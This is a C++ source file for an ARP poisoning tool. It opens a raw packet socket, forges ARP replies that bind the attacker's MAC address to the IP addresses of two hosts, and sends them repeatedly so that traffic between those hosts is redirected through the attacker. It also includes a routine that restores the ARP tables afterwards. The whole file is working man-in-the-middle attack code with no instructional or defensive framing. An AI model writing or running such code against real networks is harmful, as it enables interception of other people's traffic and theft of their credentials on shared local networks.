#define _DEFAULT_SOURCE 1
#define _BSD_SOURCE 1

#include "ArpPoisoner.hpp"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>
#include <stdexcept>
#include <iostream>
#include <iomanip>

#pragma pack(push, 1)
struct ArpPacket {
    uint16_t hwType;
    uint16_t protoType;
    uint8_t hwAddrLen;
    uint8_t protoAddrLen;
    uint16_t operation;
    uint8_t senderMac[6];
    uint8_t senderIp[4];
    uint8_t targetMac[6];
    uint8_t targetIp[4];
};
#pragma pack(pop)

ArpPoisoner::ArpPoisoner(const std::string& interface)
    : interface_(interface), sockfd_(-1), isActive_(false) {
    createRawSocket();
    if (!getInterfaceMac(attackerMac_)) {
        throw std::runtime_error("Failed to get interface MAC address");
    }
}

ArpPoisoner::~ArpPoisoner() {
    stopPoisoning();
    if (sockfd_ >= 0) {
        close(sockfd_);
    }
}

void ArpPoisoner::createRawSocket() {
    sockfd_ = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockfd_ < 0) {
        throw std::runtime_error("Failed to create raw socket");
    }
}

bool ArpPoisoner::getInterfaceMac(std::string& outMac) {
    struct ifreq ifr;
    std::memset(&ifr, 0, sizeof(ifr));
    std::strncpy(ifr.ifr_name, interface_.c_str(), IFNAMSIZ - 1);
    
    if (ioctl(sockfd_, SIOCGIFHWADDR, &ifr) < 0) {
        return false;
    }
    
    char mac[18];
    unsigned char* hwaddr = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    std::snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                 hwaddr[0], hwaddr[1], hwaddr[2], hwaddr[3], hwaddr[4], hwaddr[5]);
    outMac = mac;
    return true;
}

void ArpPoisoner::macStringToBytes(const std::string& mac, uint8_t* bytes) {
    std::sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &bytes[0], &bytes[1], &bytes[2], &bytes[3], &bytes[4], &bytes[5]);
}

uint32_t ArpPoisoner::ipStringToInt(const std::string& ip) {
    struct in_addr addr;
    inet_pton(AF_INET, ip.c_str(), &addr);
    return addr.s_addr;
}

bool ArpPoisoner::sendArpPacket(const std::string& srcIp, const std::string& srcMac,
                               const std::string& dstIp, const std::string& dstMac,
                               uint16_t operation) {
    uint8_t frame[42];
    std::memset(frame, 0, sizeof(frame));
    
    uint8_t dstMacBytes[6];
    macStringToBytes(dstMac, dstMacBytes);
    std::memcpy(frame, dstMacBytes, 6);
    
    uint8_t srcMacBytes[6];
    macStringToBytes(srcMac, srcMacBytes);
    std::memcpy(frame + 6, srcMacBytes, 6);
    
    frame[12] = 0x08;
    frame[13] = 0x06;
    
    ArpPacket* arp = (ArpPacket*)(frame + 14);
    arp->hwType = htons(1);
    arp->protoType = htons(0x0800);
    arp->hwAddrLen = 6;
    arp->protoAddrLen = 4;
    arp->operation = htons(operation);
    
    macStringToBytes(srcMac, arp->senderMac);
    uint32_t srcIpInt = ipStringToInt(srcIp);
    std::memcpy(arp->senderIp, &srcIpInt, 4);
    
    macStringToBytes(dstMac, arp->targetMac);
    uint32_t dstIpInt = ipStringToInt(dstIp);
    std::memcpy(arp->targetIp, &dstIpInt, 4);
    
    struct sockaddr_ll addr;
    std::memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = if_nametoindex(interface_.c_str());
    addr.sll_halen = 6;
    std::memcpy(addr.sll_addr, dstMacBytes, 6);
    
    if (sendto(sockfd_, frame, sizeof(frame), 0, 
               (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        return false;
    }
    
    return true;
}

bool ArpPoisoner::startPoisoning(const std::string& ipSrc, const std::string& macSrc,
                                const std::string& ipTarget, const std::string& macTarget) {
    ipSrc_ = ipSrc;
    macSrc_ = macSrc;
    ipTarget_ = ipTarget;
    macTarget_ = macTarget;
    
    std::cout << "Starting ARP poisoning..." << std::endl;
    std::cout << "Attacker MAC: " << attackerMac_ << std::endl;
    
    if (!sendArpPacket(ipSrc_, attackerMac_, ipTarget_, macTarget_, 2)) {
        std::cerr << "Failed to poison target" << std::endl;
        return false;
    }
    
    if (!sendArpPacket(ipTarget_, attackerMac_, ipSrc_, macSrc_, 2)) {
        std::cerr << "Failed to poison source" << std::endl;
        return false;
    }
    
    isActive_ = true;
    std::cout << "ARP poisoning active (full duplex)" << std::endl;
    return true;
}

void ArpPoisoner::maintainPoisoning() {
    if (!isActive_) return;
    
    sendArpPacket(ipSrc_, attackerMac_, ipTarget_, macTarget_, 2);
    sendArpPacket(ipTarget_, attackerMac_, ipSrc_, macSrc_, 2);
}

void ArpPoisoner::stopPoisoning() {
    if (!isActive_) return;
    
    std::cout << "Restoring ARP tables..." << std::endl;
    
    for (int i = 0; i < 5; i++) {
        sendArpPacket(ipSrc_, macSrc_, ipTarget_, macTarget_, 2);
        sendArpPacket(ipTarget_, macTarget_, ipSrc_, macSrc_, 2);
        usleep(100000);
    }
    
    isActive_ = false;
    std::cout << "ARP tables restored" << std::endl;
}